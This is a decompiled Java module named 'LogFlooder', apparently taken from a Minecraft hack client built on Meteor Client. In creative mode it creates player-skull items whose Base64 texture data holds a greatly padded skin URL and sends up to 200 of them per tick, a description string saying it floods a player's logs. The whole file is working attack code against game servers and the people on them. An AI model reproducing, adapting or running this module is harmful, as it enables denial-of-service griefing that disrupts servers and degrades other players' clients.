/*     */ package meteordevelopment.meteorclient.systems.modules.Dark;
/*     */ 
/*     */ import java.util.Base64;
/*     */ import java.util.Random;
/*     */ import meteordevelopment.meteorclient.events.game.GameLeftEvent;
/*     */ import meteordevelopment.meteorclient.events.world.TickEvent;
/*     */ import meteordevelopment.meteorclient.settings.BoolSetting;
/*     */ import meteordevelopment.meteorclient.settings.EnumSetting;
/*     */ import meteordevelopment.meteorclient.settings.IntSetting;
/*     */ import meteordevelopment.meteorclient.settings.Setting;
/*     */ import meteordevelopment.meteorclient.settings.SettingGroup;
/*     */ import meteordevelopment.meteorclient.systems.modules.Categories;
/*     */ import meteordevelopment.meteorclient.systems.modules.Module;
/*     */ import meteordevelopment.orbit.EventHandler;
/*     */ import net.minecraft.class_1799;
/*     */ import net.minecraft.class_1802;
/*     */ import net.minecraft.class_1935;
/*     */ import net.minecraft.class_2487;
/*     */ import net.minecraft.class_2495;
/*     */ import net.minecraft.class_2499;
/*     */ import net.minecraft.class_2519;
/*     */ import net.minecraft.class_2520;
/*     */ 
/*     */ public class LogFlooder extends Module {
/*  25 */   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
/*     */   
/*  27 */   private final Setting<Slot> slot = this.sgGeneral.add((Setting)((EnumSetting.Builder)((EnumSetting.Builder)((EnumSetting.Builder)(new EnumSetting.Builder())
/*  28 */       .name("slot"))
/*  29 */       .description("Which slot to use."))
/*  30 */       .defaultValue(Slot.First))
/*  31 */       .build());
/*     */ 
/*     */   
/*  34 */   private final Setting<Integer> amount = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/*  35 */       .name("amount"))
/*  36 */       .description("How many packets to send to the server per tick."))
/*  37 */       .defaultValue(Integer.valueOf(5)))
/*  38 */       .min(1)
/*  39 */       .sliderMin(1)
/*  40 */       .sliderMax(200)
/*  41 */       .build());
/*     */ 
/*     */   
/*  44 */   private final Setting<Integer> size = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/*  45 */       .name("size"))
/*  46 */       .description("The size of the skull's URL"))
/*  47 */       .defaultValue(Integer.valueOf(500)))
/*  48 */       .min(1)
/*  49 */       .sliderMin(1)
/*  50 */       .sliderMax(2000)
/*  51 */       .build());
/*     */ 
/*     */   
/*  54 */   private final Setting<Boolean> autoDisable = this.sgGeneral.add((Setting)((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder())
/*  55 */       .name("auto-disable"))
/*  56 */       .description("Disables module on kick."))
/*  57 */       .defaultValue(Boolean.valueOf(true)))
/*  58 */       .build());
/*     */ 
/*     */   
/*     */   public LogFlooder() {
/*  62 */     super(Categories.Dark, "log-flooder", "Attempts to flood a player's logs.");
/*     */   }
/*     */ 
/*     */   
/*     */   public void onActivate() {
/*  67 */     if (!(this.mc.field_1724.method_31549()).field_7477) {
/*  68 */       error("You must be in creative mode to use this.", new Object[0]);
/*  69 */       toggle();
/*     */     } 
/*     */   }
/*     */   
/*     */   @EventHandler
/*     */   private void onTick(TickEvent.Post event) {
/*  75 */     for (int i = 0; i < ((Integer)this.amount.get()).intValue(); i++) {
/*  76 */       class_1799 stack = new class_1799((class_1935)class_1802.field_8575);
/*  77 */       class_2487 tag = new class_2487();
/*  78 */       class_2487 skullOwner = new class_2487();
/*  79 */       skullOwner.method_10566("Id", (class_2520)new class_2495(new int[] { 1044599774, -91344643, -1626455549, -827872364 }));
/*  80 */       skullOwner.method_10566("Name", (class_2520)class_2519.method_23256("Divine" + (new Random()).nextInt(50000)));
/*  81 */       class_2487 textures = new class_2487();
/*  82 */       class_2499 list = new class_2499();
/*  83 */       class_2487 value = new class_2487();
/*  84 */       String texture = "{\"textures\":{\"SKIN\":{\"url\":\"https://education.minecraft.net/wp-content/uploads/" + "Hiii".repeat(((Integer)this.size.get()).intValue()) + (new Random()).nextInt(5000000) + ".png\"}}}";
/*  85 */       value.method_10566("Value", (class_2520)class_2519.method_23256(Base64.getEncoder().encodeToString(texture.getBytes())));
/*  86 */       list.add(value);
/*  87 */       textures.method_10566("textures", (class_2520)list);
/*  88 */       skullOwner.method_10566("Properties", (class_2520)textures);
/*  89 */       tag.method_10566("SkullOwner", (class_2520)skullOwner);
/*  90 */       stack.method_7980(tag);
/*  91 */       switch ((Slot)this.slot.get()) { case First:
/*  92 */           this.mc.field_1761.method_2909(stack, 36); break;
/*  93 */         case Offhand: this.mc.field_1761.method_2909(stack, 45); break;
/*  94 */         case Helmet: this.mc.field_1761.method_2909(stack, 5);
/*     */           break; }
/*     */     
/*     */     } 
/*     */   }
/*     */   @EventHandler
/*     */   private void onGameLeft(GameLeftEvent event) {
/* 101 */     if (((Boolean)this.autoDisable.get()).booleanValue()) toggle(); 
/*     */   }
/*     */   
/*     */   public enum Slot {
/* 105 */     First,
/* 106 */     Offhand,
/* 107 */     Helmet;
/*     */   }
/*     */ }


/* Location:              C:\Users\Shees\Downloads\DarkClient.jar!\meteordevelopment\meteorclient\systems\modules\Dark\LogFlooder.class
 * Java compiler version: 17 (61.0)
 * JD-Core Version:       1.1.3
 */